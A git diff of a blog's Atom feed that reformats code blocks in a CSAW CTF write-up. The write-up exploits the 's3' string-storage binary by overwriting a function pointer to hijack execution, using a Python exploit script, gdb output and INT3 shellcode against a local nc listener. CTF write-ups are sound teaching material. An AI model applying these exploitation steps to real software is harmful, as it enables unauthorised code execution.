@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Csaw | staring into /dev/null]]></title>
   <link href="http://barrebas.github.io/blog/categories/csaw/atom.xml" rel="self"/>
   <link href="http://barrebas.github.io/"/>
-  <updated>2014-12-01T21:09:11+01:00</updated>
+  <updated>2014-12-02T22:07:47+01:00</updated>
   <id>http://barrebas.github.io/</id>
   <author>
     <name><![CDATA[barrebas]]></name>
@@ -25,42 +25,50 @@
 
 <p>Upon downloading the binary called <code>s3</code>, I connected to the remote server to quickly see what I was up against.</p>
 
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>nc 54.165.225.121 5333</code></pre></div></p>
+<p>{% highlight bash %}
+$ nc 54.165.225.121 5333
+{% endhighlight %}</p>
 
 <p>However, the connection timed out very quickly. I checked out the local copy with file:</p>
 
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>file s3
-s3: ELF 64-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>, <span class="k">for</span> GNU/Linux 2.6.24, BuildID<span class="o">[</span>sha1<span class="o">]=</span>0xe99ee53d6922baffcd3cecd9e6b333f7538d0633, stripped</code></pre></div></p>
+<p>{% highlight bash %}
+$ file s3
+s3: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xe99ee53d6922baffcd3cecd9e6b333f7538d0633, stripped
+{% endhighlight %}</p>
 
 <p>Interesting, a 64 bit binary. Viewing it in <code>hopper</code> suggested that it is a C++ binary. I started the binary locally and faced the same quick time-out. This didn&rsquo;t sit well with me, because I could hardly enter the second command to play around.</p>
 
 <p>I fired up <code>gdb-peda</code> and ran the binary. It quickly showed the problem:</p>
 
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">gdb-peda<span class="nv">$ </span>r
-warning: Could not load shared library symbols <span class="k">for</span> linux-vdso.so.1.
-Do you need <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="nb">set </span>solib-search-path<span class="p">&amp;</span>rdquo<span class="p">;</span> or <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="nb">set </span>sysroot<span class="p">&amp;</span>rdquo<span class="p">;</span>?
-Welcome to Amazon S3 <span class="o">(</span>String Storage Service<span class="o">)</span>&lt;/p&gt;
+<p>{% highlight bash %}
+gdb-peda$ r
+warning: Could not load shared library symbols for linux-vdso.so.1.
+Do you need &ldquo;set solib-search-path&rdquo; or &ldquo;set sysroot&rdquo;?
+Welcome to Amazon S3 (String Storage Service)</p>
 
-&lt;pre&gt;&lt;code&gt;c <span class="p">&amp;</span>lt<span class="p">;</span><span class="nb">type</span><span class="p">&amp;</span>gt<span class="p">;</span> <span class="p">&amp;</span>lt<span class="p">;</span>string<span class="p">&amp;</span>gt<span class="p">;</span> - Create the string <span class="p">&amp;</span>lt<span class="p">;</span>string<span class="p">&amp;</span>gt<span class="p">;</span> as <span class="p">&amp;</span>lt<span class="p">;</span><span class="nb">type</span><span class="p">&amp;</span>gt<span class="p">;</span>
+<pre><code>c &lt;type&gt; &lt;string&gt; - Create the string &lt;string&gt; as &lt;type&gt;
                     Types are:
-                        <span class="m">0</span> - NULL-Terminated String
-                        <span class="m">1</span> - Counted String
-r <span class="p">&amp;</span>lt<span class="p">;</span>id<span class="p">&amp;</span>gt<span class="p">;</span>            - Read the string referenced by <span class="p">&amp;</span>lt<span class="p">;</span>id<span class="p">&amp;</span>gt<span class="p">;</span>
-u <span class="p">&amp;</span>lt<span class="p">;</span>id<span class="p">&amp;</span>gt<span class="p">;</span> <span class="p">&amp;</span>lt<span class="p">;</span>string<span class="p">&amp;</span>gt<span class="p">;</span>   - Update the string referenced by <span class="p">&amp;</span>lt<span class="p">;</span>id<span class="p">&amp;</span>gt<span class="p">;</span> to <span class="p">&amp;</span>lt<span class="p">;</span>string<span class="p">&amp;</span>gt<span class="p">;</span>
-d <span class="p">&amp;</span>lt<span class="p">;</span>id<span class="p">&amp;</span>gt<span class="p">;</span>            - Destroy the string referenced by <span class="p">&amp;</span>lt<span class="p">;</span>id<span class="p">&amp;</span>gt<span class="p">;</span>
+                        0 - NULL-Terminated String
+                        1 - Counted String
+r &lt;id&gt;            - Read the string referenced by &lt;id&gt;
+u &lt;id&gt; &lt;string&gt;   - Update the string referenced by &lt;id&gt; to &lt;string&gt;
+d &lt;id&gt;            - Destroy the string referenced by &lt;id&gt;
 x                 - Exit Amazon S3
-&lt;/code&gt;&lt;/pre&gt;
+</code></pre>
 
-&lt;blockquote&gt;&lt;p&gt;Program received signal SIGALRM, Alarm clock.</code></pre></div></p></blockquote>
+<blockquote><p>Program received signal SIGALRM, Alarm clock.
+{% endhighlight %}</p></blockquote>
 
 <p><img src="/assets/s3-gdb-alarm.png" alt="s3: gdb caught the alarm." /></p>
 
 <p>Turns out this SIGALRM is generated by a call to <a href="http://linux.die.net/man/2/alarm">alarm()</a>. In hindsight, I could have made a library that overrides the call to <code>alarm()</code>, but I went with the hex-editing approach. I disassembled the binary using <code>objdump</code> and used <code>grep</code> to search the output for &ldquo;alarm&rdquo;:</p>
 
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>objdump -d s3 <span class="p">|</span> grep alarm
-<span class="m">0000000000401300</span> <span class="p">&amp;</span>lt<span class="p">;</span>alarm@plt&gt;:
-  402126:   e8 d5 f1 ff ff          callq  <span class="m">401300</span> <span class="p">&amp;</span>lt<span class="p">;</span>alarm@plt&gt;
-  403771:   e8 8a db ff ff          callq  <span class="m">401300</span> <span class="p">&amp;</span>lt<span class="p">;</span>alarm@plt&gt;</code></pre></div></p>
+<p>{% highlight bash %}
+$ objdump -d s3 | grep alarm
+0000000000401300 &lt;alarm@plt>:
+  402126:   e8 d5 f1 ff ff          callq  401300 &lt;alarm@plt>
+  403771:   e8 8a db ff ff          callq  401300 &lt;alarm@plt>
+{% endhighlight %}</p>
 
 <p>Using <code>xxd</code>, <code>objdump</code> and <code>sed</code>, I replaced those bytes with NOPs and reversed the process with <code>xxd -r</code>, generating a new binary in the process that was devoid of annoying timeouts!</p>
 
@@ -78,7 +86,9 @@ x                 - Exit Amazon S3
 
 <p>It looks like the updated string somehow overwrites a function pointer. This pointer is used here:</p>
 
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">=</span>&gt; 0x4019d6:    call   QWORD PTR <span class="o">[</span>rax+0x10<span class="o">]</span></code></pre></div></p>
+<p>{% highlight bash %}
+=> 0x4019d6:    call   QWORD PTR [rax+0x10]
+{% endhighlight %}</p>
 
 <p>Obviously, <code>0x42424242-0x10</code> holds nothing interesting. However, we have overwritten a function pointer with a value that we control so in principle, we can hijack <code>EIP</code> and execute arbitrary code! The drawback is that the pointer is derefenced, so in order to execute any shellcode, we need to do the following:</p>
 
@@ -90,175 +100,185 @@ x                 - Exit Amazon S3
 
 <p>I got tired of copying and pasting the string identifiers so I switched over to python. In order to emulate the server, I put the binary behind a nc listener:</p>
 
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span><span class="k">while</span> <span class="o">[[</span> <span class="m">1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">do</span> nc -e ./s3 -v -l -p 5333<span class="p">;</span> <span class="k">done</span></code></pre></div></p>
+<p>{% highlight bash %}
+$ while [[ 1 ]]; do nc -e ./s3 -v -l -p 5333; done
+{% endhighlight %}</p>
 
 <p>Notice that I&rsquo;m using <code>s3</code> again, as this will automagically restart without the need for a clean shutdown (in case the script needs debugging). I enabled coredumps with <code>ulimit -c unlimited</code> and started scripting and debugging, a lot.</p>
 
-<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>{% highlight python %}</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>!/usr/bin/python</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">struct</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>from socket import *
+import time, re, struct</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">def</span> <span class="nf">getID</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
-    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;(\d.*)$&amp;lsquo;, data.strip())&amp;lt;  &lt;br/&gt;</span>
-    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
-        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>def getID(data):
+    match = re.search(r&#8217;(\d.*)$&lsquo;, data.strip())&lt;  <br/>
+    if match:
+        return int(match.group(1))</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">localhost</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="mi">5333</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>s = socket(AF_INET, SOCK_STREAM)
+s.connect((&lsquo;localhost&rsquo;, 5333))</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">banner</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>banner</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>print s.recv(1024)</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">send</span> <span class="n">first</span> <span class="n">string</span><span class="o">.</span> <span class="n">this</span> <span class="n">will</span> <span class="n">be</span> <span class="n">our</span> <span class="n">shellcode</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>send first string. this will be our shellcode</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">c</span> <span class="mi">0</span> <span class="n">CTF</span><span class="err">!</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>   <span class="c"># receive pesky &amp;lsquo;&gt; &amp;rsquo;</span>
-<span class="n">p_shellcode</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>s.send(&lsquo;c 0 CTF!\n&rsquo;)
+data = s.recv(64)
+s.recv(2)   # receive pesky &lsquo;> &rsquo;
+p_shellcode = getID(data)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">first</span> <span class="n">location</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x</span><span class="p">{</span><span class="mi">0</span><span class="p">:</span><span class="mi">08</span><span class="n">x</span><span class="p">}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_shellcode</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>print &lsquo;[+] first location = 0x{0:08x}&rsquo;.format(p_shellcode)</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">send</span> <span class="n">second</span> <span class="n">string</span><span class="o">.</span> <span class="n">this</span> <span class="n">will</span> <span class="n">be</span> <span class="n">our</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">pivot</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="n">pointer</span><span class="o">.&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>send second string. this will be our &lsquo;pivot&rsquo; pointer.</h1>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">let</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">s</span> <span class="n">crash</span> <span class="n">the</span> <span class="n">binary</span> <span class="n">to</span> <span class="n">see</span> <span class="k">if</span> <span class="n">this</span> <span class="n">works</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>let&rsquo;s crash the binary to see if this works</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">c</span> <span class="mi">1</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>s.send(&ldquo;c 1\n&rdquo;)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>   <span class="c"># receive pesky &amp;lsquo;&gt; &amp;rsquo;</span>
-<span class="n">p_tmp</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>data = s.recv(64)
+s.recv(2)   # receive pesky &lsquo;> &rsquo;
+p_tmp = getID(data)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">u</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_tmp</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span> <span class="n">AAAA</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>s.send(&lsquo;u &rsquo; + str(p_tmp) + &lsquo; AAAA\n&rsquo;)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">p_pivot</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>data = s.recv(64)
+p_pivot = getID(data)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">second</span> <span class="n">location</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x</span><span class="p">{</span><span class="mi">0</span><span class="p">:</span><span class="mi">08</span><span class="n">x</span><span class="p">}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_pivot</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>print &lsquo;[+] second location = 0x{0:08x}&rsquo;.format(p_pivot)</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">send</span> <span class="n">read</span> <span class="n">request</span> <span class="n">to</span> <span class="n">crash</span> <span class="n">binary</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>send read request to crash binary</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">r</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_pivot</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>   <span class="c"># receive pesky &amp;lsquo;&gt; &amp;rsquo;&lt;/p&gt;</span>
+<p>s.send(&lsquo;r &rsquo; + str(p_pivot) + &lsquo;\n&rsquo;)
+data = s.recv(64)
+s.recv(2)   # receive pesky &lsquo;> &rsquo;</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">terminate</span> <span class="n">connection</span> <span class="n">cleanly</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>terminate connection cleanly</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">x</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>time.sleep(0.1)
+s.send(&lsquo;x\n&rsquo;)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div></p>
+<p>s.close()
+{% endhighlight %}</p>
 
 <p>After running this (and careful debugging of the script) I got a coredump:</p>
 
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>python ./amaz.py
-Welcome to Amazon S3 <span class="o">(</span>String Storage Service<span class="o">)</span>&lt;/p&gt;
+<p>{% highlight bash %}
+$ python ./amaz.py
+Welcome to Amazon S3 (String Storage Service)</p>
 
-&lt;pre&gt;&lt;code&gt;c <span class="p">&amp;</span>lt<span class="p">;</span><span class="nb">type</span><span class="p">&amp;</span>gt<span class="p">;</span> <span class="p">&amp;</span>lt<span class="p">;</span>string<span class="p">&amp;</span>gt<span class="p">;</span> - Create the string <span class="p">&amp;</span>lt<span class="p">;</span>string<span class="p">&amp;</span>gt<span class="p">;</span> as <span class="p">&amp;</span>lt<span class="p">;</span><span class="nb">type</span><span class="p">&amp;</span>gt<span class="p">;</span>
+<pre><code>c &lt;type&gt; &lt;string&gt; - Create the string &lt;string&gt; as &lt;type&gt;
                     Types are:
-                        <span class="m">0</span> - NULL-Terminated String
-                        <span class="m">1</span> - Counted String
-r <span class="p">&amp;</span>lt<span class="p">;</span>id<span class="p">&amp;</span>gt<span class="p">;</span>            - Read the string referenced by <span class="p">&amp;</span>lt<span class="p">;</span>id<span class="p">&amp;</span>gt<span class="p">;</span>
-u <span class="p">&amp;</span>lt<span class="p">;</span>id<span class="p">&amp;</span>gt<span class="p">;</span> <span class="p">&amp;</span>lt<span class="p">;</span>string<span class="p">&amp;</span>gt<span class="p">;</span>   - Update the string referenced by <span class="p">&amp;</span>lt<span class="p">;</span>id<span class="p">&amp;</span>gt<span class="p">;</span> to <span class="p">&amp;</span>lt<span class="p">;</span>string<span class="p">&amp;</span>gt<span class="p">;</span>
-d <span class="p">&amp;</span>lt<span class="p">;</span>id<span class="p">&amp;</span>gt<span class="p">;</span>            - Destroy the string referenced by <span class="p">&amp;</span>lt<span class="p">;</span>id<span class="p">&amp;</span>gt<span class="p">;</span>
+                        0 - NULL-Terminated String
+                        1 - Counted String
+r &lt;id&gt;            - Read the string referenced by &lt;id&gt;
+u &lt;id&gt; &lt;string&gt;   - Update the string referenced by &lt;id&gt; to &lt;string&gt;
+d &lt;id&gt;            - Destroy the string referenced by &lt;id&gt;
 x                 - Exit Amazon S3
-&lt;/code&gt;&lt;/pre&gt;
+</code></pre>
 
-&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> first <span class="nv">location</span> <span class="o">=</span> 0x00b10030
-<span class="o">[</span>+<span class="o">]</span> second <span class="nv">location</span> <span class="o">=</span> 0x00b10050
-bas@tritonal:~/documents/s3 writeup<span class="nv">$ </span>gdb ./s3 core
-<span class="p">&amp;</span>hellip<span class="p">;</span>snip<span class="p">&amp;</span>hellip<span class="p">;</span>
-gdb-peda<span class="nv">$ </span>i r
-rax            0x41414141   0x41414141</code></pre></div></p>
+<p>[+] first location = 0x00b10030
+[+] second location = 0x00b10050
+bas@tritonal:~/documents/s3 writeup$ gdb ./s3 core
+&hellip;snip&hellip;
+gdb-peda$ i r
+rax            0x41414141   0x41414141
+{% endhighlight %}</p>
 
 <p>Good, we have control over <code>rax</code>. Now let&rsquo;s use this to dereference the pointer to the first string:</p>
 
-<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">u</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_tmp</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&gt;</span><span class="n">L</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="n">p_shellcode</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span></code></pre></div></p>
+<p>{% highlight python %}
+s.send(&lsquo;u &rsquo; + str(p_tmp) + &lsquo; &rsquo; + struct.pack(&lsquo;>L&rsquo;, p_shellcode-0x10) + &lsquo;\n&rsquo;)
+{% endhighlight %}</p>
 
 <p>Which obviously still crashes, because now the binary executes:</p>
 
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;/p&gt;
+<p>{% highlight bash %}</p>
 
-&lt;h1&gt;0  0x0000000021465443 in ?? <span class="o">()</span>&lt;/h1&gt;
+<h1>0  0x0000000021465443 in ?? ()</h1>
 
-&lt;p&gt;</code></pre></div></p>
+<p>{% endhighlight %}</p>
 
 <p>Which obviously contains no data, nor any code. But let&rsquo;s give it a proper pointer, shall we? And while I&rsquo;m at it, I&rsquo;ll set the shellcode to <code>INT3</code>. The stack is executable, so this should work!</p>
 
-<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>{% highlight python %}</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>!/usr/bin/python</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">struct</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>from socket import *
+import time, re, struct</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">def</span> <span class="nf">getID</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
-    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;(\d.*)$&amp;lsquo;, data.strip())</span>
-    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
-        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>def getID(data):
+    match = re.search(r&#8217;(\d.*)$&lsquo;, data.strip())
+    if match:
+        return int(match.group(1))</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">localhost</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="mi">5333</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>s = socket(AF_INET, SOCK_STREAM)
+s.connect((&lsquo;localhost&rsquo;, 5333))</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">banner</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>banner</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>print s.recv(1024)</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">send</span> <span class="n">first</span> <span class="n">string</span><span class="o">.</span> <span class="n">this</span> <span class="n">will</span> <span class="n">be</span> <span class="n">our</span> <span class="n">shellcode</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>send first string. this will be our shellcode</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">c</span> <span class="mi">0</span> \<span class="n">xCC</span>\<span class="n">xCC</span>\<span class="n">xCC</span>\<span class="n">xCC</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>   <span class="c"># receive pesky &amp;lsquo;&gt; &amp;rsquo;</span>
-<span class="n">p_shellcode</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>s.send(&lsquo;c 0 \xCC\xCC\xCC\xCC\n&rsquo;)
+data = s.recv(64)
+s.recv(2)   # receive pesky &lsquo;> &rsquo;
+p_shellcode = getID(data)</p>
 
